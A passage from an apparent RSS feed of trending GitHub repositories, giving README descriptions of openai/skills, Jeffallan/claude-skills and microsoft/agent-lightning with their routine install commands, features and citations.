      author={Yufan Dang and Chen Qian and Xueheng Luo and Jingru Fan and Zihao Xie and Ruijie Shi and Weize Chen and Cheng Yang and Xiaoyin Che and Ye Tian and Xuantang Xiong and Lei Han and Zhiyuan Liu and Maosong Sun},
      journal={arXiv preprint arXiv:2505.19591},
      url={https://arxiv.org/abs/2505.19591},
      year={2025}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;üì¨ Contact&lt;/h2&gt; 
&lt;p&gt;If you have any questions, feedback, or would like to get in touch, please feel free to reach out to us via email at &lt;a href="mailto:qianc62@gmail.com"&gt;qianc62@gmail.com&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>openai/skills</title>
      <link>https://github.com/openai/skills</link>
      <description>&lt;p&gt;Skills Catalog for Codex&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Agent Skills&lt;/h1&gt; 
&lt;p&gt;Agent Skills are folders of instructions, scripts, and resources that AI agents can discover and use to perform at specific tasks. Write once, use everywhere.&lt;/p&gt; 
&lt;p&gt;Codex uses skills to help package capabilities that teams and individuals can use to complete specific tasks in a repeatable way. This repository catalogs skills for use and distribution with Codex.&lt;/p&gt; 
&lt;p&gt;Learn more:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://developers.openai.com/codex/skills"&gt;Using skills in Codex&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developers.openai.com/codex/skills/create-skill"&gt;Create custom skills in Codex&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://agentskills.io"&gt;Agent Skills open standard&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installing a skill&lt;/h2&gt; 
&lt;p&gt;Skills in &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.system/"&gt;&lt;code&gt;.system&lt;/code&gt;&lt;/a&gt; are automatically installed in the latest version of Codex.&lt;/p&gt; 
&lt;p&gt;To install &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.curated/"&gt;curated&lt;/a&gt; or &lt;a href="https://raw.githubusercontent.com/openai/skills/main/skills/.experimental/"&gt;experimental&lt;/a&gt; skills, you can use the &lt;code&gt;$skill-installer&lt;/code&gt; inside Codex.&lt;/p&gt; 
&lt;p&gt;Curated skills can be installed by name (defaults to &lt;code&gt;skills/.curated&lt;/code&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer gh-address-comments
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For experimental skills, specify the skill folder. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer install the create-plan skill from the .experimental folder
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Or provide the GitHub directory URL:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$skill-installer install https://github.com/openai/skills/tree/main/skills/.experimental/create-plan
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After installing a skill, restart Codex to pick up new skills.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;The license of an individual skill can be found directly inside the skill's directory inside the &lt;code&gt;LICENSE.txt&lt;/code&gt; file.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Jeffallan/claude-skills</title>
      <link>https://github.com/Jeffallan/claude-skills</link>
      <description>&lt;p&gt;65 Specialized Skills for Full-Stack Developers. Transform Claude Code into your expert pair programmer.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://capsule-render.vercel.app/api?type=waving&amp;amp;color=gradient&amp;amp;customColorList=12,14,25,27&amp;amp;height=200&amp;amp;section=header&amp;amp;text=Claude%20Skills&amp;amp;fontSize=80&amp;amp;fontColor=ffffff&amp;amp;animation=fadeIn&amp;amp;fontAlignY=35&amp;amp;desc=65%20Skills%20%E2%80%A2%209%20Workflows%20%E2%80%A2%20Built%20for%20Full-Stack%20Devs&amp;amp;descSize=20&amp;amp;descAlignY=55" width="100%" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/jeffallan/claude-skills"&gt;&lt;img src="https://img.shields.io/badge/version-0.4.4-blue.svg?style=for-the-badge" alt="Version" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://github.com/jeffallan/claude-skills"&gt;&lt;img src="https://img.shields.io/badge/Claude_Code-Plugin-purple.svg?style=for-the-badge" alt="Claude Code" /&gt;&lt;/a&gt; &lt;a href="https://github.com/jeffallan/claude-skills/stargazers"&gt;&lt;img src="https://img.shields.io/github/stars/jeffallan/claude-skills?style=for-the-badge&amp;amp;color=yellow" alt="Stars" /&gt;&lt;/a&gt; &lt;a href="https://github.com/jeffallan/claude-skills/actions/workflows/ci.yml"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/jeffallan/claude-skills/ci.yml?branch=main&amp;amp;style=for-the-badge&amp;amp;label=CI" alt="CI" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;strong&gt;
  &lt;!-- SKILL_COUNT --&gt;65
  &lt;!-- /SKILL_COUNT --&gt; Skills&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- WORKFLOW_COUNT --&gt;9
  &lt;!-- /WORKFLOW_COUNT --&gt; Workflows&lt;/strong&gt; | &lt;strong&gt;Context Engineering&lt;/strong&gt; | &lt;strong&gt;Progressive Disclosure&lt;/strong&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/Chat2AnyLLM/awesome-claude-skills/raw/main/FULL-SKILLS.md"&gt;&lt;img src="https://img.shields.io/github/stars/Chat2AnyLLM/awesome-claude-skills?style=for-the-badge&amp;amp;label=awesome-claude-skills&amp;amp;color=brightgreen&amp;amp;logo=awesomelists&amp;amp;logoColor=white" alt="Awesome Claude Skills" /&gt;&lt;/a&gt; &lt;a href="https://github.com/BehiSecc/awesome-claude-skills"&gt;&lt;img src="https://img.shields.io/github/stars/BehiSecc/awesome-claude-skills?style=for-the-badge&amp;amp;label=awesome-claude-skills&amp;amp;color=brightgreen&amp;amp;logo=awesomelists&amp;amp;logoColor=white" alt="Awesome Claude Skills (BehiSecc)" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Quick Start&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;/plugin marketplace add jeffallan/claude-skills
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;then&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;/plugin install fullstack-dev-skills@jeffallan
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For all installation methods and first steps, see the &lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/QUICKSTART.md"&gt;Quick Start Guide&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Full documentation:&lt;/strong&gt; &lt;a href="https://jeffallan.github.io/claude-skills"&gt;jeffallan.github.io/claude-skills&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Skills&lt;/h2&gt; 
&lt;!-- SKILL_COUNT --&gt;65
&lt;!-- /SKILL_COUNT --&gt; specialized skills across 12 categories covering languages, backend/frontend frameworks, infrastructure, APIs, testing, DevOps, security, data/ML, and platform specialists. 
&lt;p&gt;See &lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/SKILLS_GUIDE.md"&gt;Skills Guide&lt;/a&gt;&lt;/strong&gt; for the full list, decision trees, and workflow combinations.&lt;/p&gt; 
&lt;h2&gt;Usage Patterns&lt;/h2&gt; 
&lt;h3&gt;Context-Aware Activation&lt;/h3&gt; 
&lt;p&gt;Skills activate automatically based on your request:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Backend Development
"Implement JWT authentication in my NestJS API"
‚Üí Activates: NestJS Expert ‚Üí Loads: references/authentication.md

# Frontend Development
"Build a React component with Server Components"
‚Üí Activates: React Expert ‚Üí Loads: references/server-components.md
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Multi-Skill Workflows&lt;/h3&gt; 
&lt;p&gt;Complex tasks combine multiple skills:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Feature Development: Feature Forge ‚Üí Architecture Designer ‚Üí Fullstack Guardian ‚Üí Test Master ‚Üí DevOps Engineer
Bug Investigation:   Debugging Wizard ‚Üí Framework Expert ‚Üí Test Master ‚Üí Code Reviewer
Security Hardening:  Secure Code Guardian ‚Üí Security Reviewer ‚Üí Test Master
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Context Engineering&lt;/h2&gt; 
&lt;p&gt;Surface and validate Claude's hidden assumptions about your project with &lt;code&gt;/common-ground&lt;/code&gt;. See the &lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/COMMON_GROUND.md"&gt;Common Ground Guide&lt;/a&gt;&lt;/strong&gt; for full documentation.&lt;/p&gt; 
&lt;h2&gt;Project Workflow&lt;/h2&gt; 
&lt;!-- WORKFLOW_COUNT --&gt;9
&lt;!-- /WORKFLOW_COUNT --&gt; workflow commands manage epics from discovery through retrospectives, integrating with Jira and Confluence. See **[Workflow Commands Reference](docs/WORKFLOW_COMMANDS.md)** for the full command reference and lifecycle diagrams. 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Setup:&lt;/strong&gt; Workflow commands require an Atlassian MCP server. See the &lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/ATLASSIAN_MCP_SETUP.md"&gt;Atlassian MCP Setup Guide&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/QUICKSTART.md"&gt;Quick Start Guide&lt;/a&gt;&lt;/strong&gt; - Installation and first steps&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/SKILLS_GUIDE.md"&gt;Skills Guide&lt;/a&gt;&lt;/strong&gt; - Skill reference and decision trees&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/COMMON_GROUND.md"&gt;Common Ground&lt;/a&gt;&lt;/strong&gt; - Context engineering with &lt;code&gt;/common-ground&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/WORKFLOW_COMMANDS.md"&gt;Workflow Commands&lt;/a&gt;&lt;/strong&gt; - Project workflow commands guide&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/ATLASSIAN_MCP_SETUP.md"&gt;Atlassian MCP Setup&lt;/a&gt;&lt;/strong&gt; - Atlassian MCP server setup&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/local_skill_development.md"&gt;Local Development&lt;/a&gt;&lt;/strong&gt; - Local skill development&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/CONTRIBUTING.md"&gt;Contributing&lt;/a&gt;&lt;/strong&gt; - Contribution guidelines&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;skills/*/SKILL.md&lt;/strong&gt; - Individual skill documentation&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;skills/*/references/&lt;/strong&gt; - Deep-dive reference materials&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;See &lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/CONTRIBUTING.md"&gt;Contributing&lt;/a&gt;&lt;/strong&gt; for guidelines on adding skills, writing references, and submitting pull requests.&lt;/p&gt; 
&lt;h2&gt;Changelog&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/CHANGELOG.md"&gt;Changelog&lt;/a&gt; for full version history and release notes.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;MIT License - See &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/LICENSE"&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt; 
&lt;h2&gt;Support&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Issues:&lt;/strong&gt; &lt;a href="https://github.com/jeffallan/claude-skills/issues"&gt;GitHub Issues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Discussions:&lt;/strong&gt; &lt;a href="https://github.com/jeffallan/claude-skills/discussions"&gt;GitHub Discussions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Repository:&lt;/strong&gt; &lt;a href="https://github.com/jeffallan/claude-skills"&gt;github.com/jeffallan/claude-skills&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Author&lt;/h2&gt; 
&lt;p&gt;Built by &lt;strong&gt;&lt;a href="https://jeffallan.github.io"&gt;jeffallan&lt;/a&gt;&lt;/strong&gt; &lt;a href="https://www.linkedin.com/in/jeff-smolinski/"&gt;&lt;img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linkedin/linkedin-original.svg?sanitize=true" width="16" height="16" alt="LinkedIn" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Principal Consultant&lt;/strong&gt; at &lt;strong&gt;&lt;a href="https://synergetic.solutions"&gt;Synergetic Solutions&lt;/a&gt;&lt;/strong&gt; &lt;a href="https://www.linkedin.com/company/synergetic-holdings"&gt;&lt;img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linkedin/linkedin-original.svg?sanitize=true" width="16" height="16" alt="LinkedIn" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Fullstack engineering, security engineering, compliance, and technical due diligence.&lt;/p&gt; 
&lt;h2&gt;Community&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/Jeffallan/claude-skills/stargazers"&gt;&lt;img src="https://reporoster.com/stars/Jeffallan/claude-skills" alt="Stargazers repo roster for @Jeffallan/claude-skills" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Star History&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://www.star-history.com/#Jeffallan/claude-skills&amp;amp;type=date&amp;amp;legend=top-left"&gt;&lt;img src="https://api.star-history.com/svg?repos=Jeffallan/claude-skills&amp;amp;type=date&amp;amp;legend=top-left" alt="Star History Chart" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;strong&gt;Built for Claude Code&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- WORKFLOW_COUNT --&gt;9
  &lt;!-- /WORKFLOW_COUNT --&gt; Workflows&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- REFERENCE_COUNT --&gt;359
  &lt;!-- /REFERENCE_COUNT --&gt; Reference Files&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- SKILL_COUNT --&gt;65
  &lt;!-- /SKILL_COUNT --&gt; Skills&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/agent-lightning</title>
      <link>https://github.com/microsoft/agent-lightning</link>
      <description>&lt;p&gt;The absolute trainer to light up AI agents.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-banner.svg?sanitize=true" alt="Agent-lightning-banner" style="width:600px" /&gt; &lt;/p&gt; 
&lt;h1&gt;Agent Lightning‚ö°&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml/badge.svg?sanitize=true" alt="Unit Tests" /&gt;&lt;/a&gt; &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;&lt;img src="https://img.shields.io/badge/GitHub%20Pages-Documentation-blue" alt="Documentation" /&gt;&lt;/a&gt; &lt;a href="https://badge.fury.io/py/agentlightning"&gt;&lt;img src="https://badge.fury.io/py/agentlightning.svg?sanitize=true" alt="PyPI version" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/microsoft/agent-lightning"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/RYk7CdvDR7"&gt;&lt;img src="https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;The absolute trainer to light up AI agents.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Join our &lt;a href="https://discord.gg/RYk7CdvDR7"&gt;Discord community&lt;/a&gt; to connect with other users and contributors.&lt;/p&gt; 
&lt;h2&gt;‚ö° Core Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Turn your agent into an optimizable beast with &lt;strong&gt;ZERO CODE CHANGE&lt;/strong&gt; (almost)! üí§&lt;/li&gt; 
 &lt;li&gt;Build with &lt;strong&gt;ANY&lt;/strong&gt; agent framework (LangChain, OpenAI Agent SDK, AutoGen, CrewAI, Microsoft Agent Framework...); or even WITHOUT agent framework (Python OpenAI). You name it! ü§ñ&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Selectively&lt;/strong&gt; optimize one or more agents in a multi-agent system. üéØ&lt;/li&gt; 
 &lt;li&gt;Embraces &lt;strong&gt;Algorithms&lt;/strong&gt; like Reinforcement Learning, Automatic Prompt Optimization, Supervised Fine-tuning and more. ü§ó&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Read more on our &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;documentation website&lt;/a&gt;.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-diff.svg?sanitize=true" alt="Agent-Lightning Core Quickstart" style="width:100%" /&gt; &lt;/p&gt; 
&lt;h2&gt;‚ö° Installation&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install agentlightning
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For the latest nightly build (cutting-edge features), you can install from Test PyPI:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install --upgrade --index-url https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple/ --pre agentlightning
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Please refer to our &lt;a href="https://microsoft.github.io/agent-lightning/stable/tutorials/installation/"&gt;installation guide&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;To start using Agent-lightning, check out our &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;documentation&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/examples"&gt;examples&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;‚ö° Articles&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;12/17/2025 &lt;a href="https://agent-lightning.github.io/posts/trajectory_level_aggregation/"&gt;Adopting the Trajectory Level Aggregation for Faster Training&lt;/a&gt; Agent-lightning blog.&lt;/li&gt; 
 &lt;li&gt;11/4/2025 &lt;a href="https://medium.com/@yugez/tuning-any-ai-agent-with-tinker-agent-lightning-part-1-1d8c9a397f0e"&gt;Tuning ANY AI agent with Tinker ‚úï Agent-lightning&lt;/a&gt; Medium. See also &lt;a href="https://medium.com/@yugez/tuning-any-ai-agent-with-tinker-agent-lightning-part-2-332c5437f0dc"&gt;Part 2&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;10/22/2025 &lt;a href="https://blog.vllm.ai/2025/10/22/agent-lightning.html"&gt;No More Retokenization Drift: Returning Token IDs via the OpenAI Compatible API Matters in Agent RL&lt;/a&gt; vLLM blog. See also &lt;a href="https://zhuanlan.zhihu.com/p/1965067274642785725"&gt;Zhihu writeup&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;8/11/2025 &lt;a href="https://medium.com/@yugez/training-ai-agents-to-write-and-self-correct-sql-with-reinforcement-learning-571ed31281ad"&gt;Training AI Agents to Write and Self-correct SQL with Reinforcement Learning&lt;/a&gt; Medium.&lt;/li&gt; 
 &lt;li&gt;8/5/2025 &lt;a href="https://arxiv.org/abs/2508.03680"&gt;Agent Lightning: Train ANY AI Agents with Reinforcement Learning&lt;/a&gt; arXiv paper.&lt;/li&gt; 
 &lt;li&gt;7/26/2025 &lt;a href="https://www.reddit.com/r/LocalLLaMA/comments/1m9m670/we_discovered_an_approach_to_train_any_ai_agent/"&gt;We discovered an approach to train any AI agent with RL, with (almost) zero code changes.&lt;/a&gt; Reddit.&lt;/li&gt; 
 &lt;li&gt;6/6/2025 &lt;a href="https://www.microsoft.com/en-us/research/project/agent-lightning/"&gt;Agent Lightning - Microsoft Research&lt;/a&gt; Project page.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚ö° Community Projects&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/af-74413592/DeepWerewolf"&gt;DeepWerewolf&lt;/a&gt; ‚Äî A case study of agent RL training for the Chinese Werewolf game built with AgentScope and Agent Lightning.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://agentflow.stanford.edu/"&gt;AgentFlow&lt;/a&gt; ‚Äî A modular multi-agent framework that combines planner, executor, verifier, and generator agents with the Flow-GRPO algorithm to tackle long-horizon, sparse-reward tasks.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/TencentCloudADP/Youtu-agent"&gt;Youtu-Agent&lt;/a&gt; ‚Äî Youtu-Agent lets you build and train your agent with ease. Built with &lt;a href="https://github.com/microsoft/agent-lightning/tree/contrib/youtu-agent-lightning"&gt;a modified branch&lt;/a&gt; of Agent Lightning, Youtu-Agent has verified up to 128 GPUs RL training on maths/code and search capabilities with steady convergence. Also check &lt;a href="https://github.com/TencentCloudADP/youtu-agent/tree/rl/agl"&gt;the recipe&lt;/a&gt; and their blog &lt;a href="https://spotted-coconut-df8.notion.site/Stop-Wrestling-with-Your-Agent-RL-How-Youtu-Agent-Achieved-Stable-128-GPU-Scaling-Without-Breaking-2ca5e8f089ba80539a98c582b65e0233"&gt;&lt;em&gt;Stop Wrestling with Your Agent RL: How Youtu-Agent Achieved Stable, 128-GPU Scaling Without Breaking a Sweat&lt;/em&gt;&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚ö° Architecture&lt;/h2&gt; 
&lt;p&gt;Agent Lightning keeps the moving parts to a minimum so you can focus on your idea, not the plumbing. Your agent continues to run as usual; you can still use any agent framework you like; you drop in the lightweight &lt;code&gt;agl.emit_xxx()&lt;/code&gt; helper, or let the tracer collect every prompt, tool call, and reward. Those events become structured spans that flow into the LightningStore, a central hub that keeps tasks, resources, and traces in sync.&lt;/p&gt; 
&lt;p&gt;On the other side of the store sits the algorithm you choose, or write yourself. The algorithm reads spans, learns from them, and posts updated resources such as refined prompt templates or new policy weights. The Trainer ties it all together: it streams datasets to runners, ferries resources between the store and the algorithm, and updates the inference engine when improvements land. You can either stop there, or simply let the same loop keep turning.&lt;/p&gt; 
&lt;p&gt;No rewrites, no lock-in, just a clear path from first rollout to steady improvement.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-architecture.svg?sanitize=true" alt="Agent-lightning Architecture" style="width:100%" /&gt; &lt;/p&gt; 
&lt;h2&gt;‚ö° CI Status&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Workflow&lt;/th&gt; 
   &lt;th&gt;Status&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;CPU Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/tests.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/tests.yml/badge.svg?sanitize=true" alt="tests workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Full Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml/badge.svg?sanitize=true" alt="tests summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;UI Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/dashboard.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/dashboard.yml/badge.svg?sanitize=true" alt="UI Tests" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Examples Integration&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-examples.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-examples.yml/badge.svg?sanitize=true" alt="examples summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Latest Dependency Compatibility&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-latest.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-latest.yml/badge.svg?sanitize=true" alt="latest summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Legacy Examples Compatibility&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-compat.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-compat.yml/badge.svg?sanitize=true" alt="compat summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;‚ö° Citation&lt;/h2&gt; 
&lt;p&gt;If you find Agent Lightning useful in your research or projects, please cite our paper:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{luo2025agentlightningtrainai,
      title={Agent Lightning: Train ANY AI Agents with Reinforcement Learning},
      author={Xufang Luo and Yuge Zhang and Zhiyuan He and Zilong Wang and Siyun Zhao and Dongsheng Li and Luna K. Qiu and Yuqing Yang},
      year={2025},
      eprint={2508.03680},
      archivePrefix={arXiv},
      primaryClass={cs.AI},
      url={https://arxiv.org/abs/2508.03680},
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;‚ö° Contributing&lt;/h2&gt; 
&lt;p&gt;This project welcomes contributions and suggestions. Start by reading the &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/community/contributing.md"&gt;Contributing Guide&lt;/a&gt; for recommended contribution points, environment setup, branching conventions, and pull request expectations. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href="https://cla.opensource.microsoft.com"&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href="https://opensource.microsoft.com/codeofconduct/"&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href="https://opensource.microsoft.com/codeofconduct/faq/"&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href="mailto:opencode@microsoft.com"&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; 
&lt;h2&gt;‚ö° Trademarks&lt;/h2&gt; 
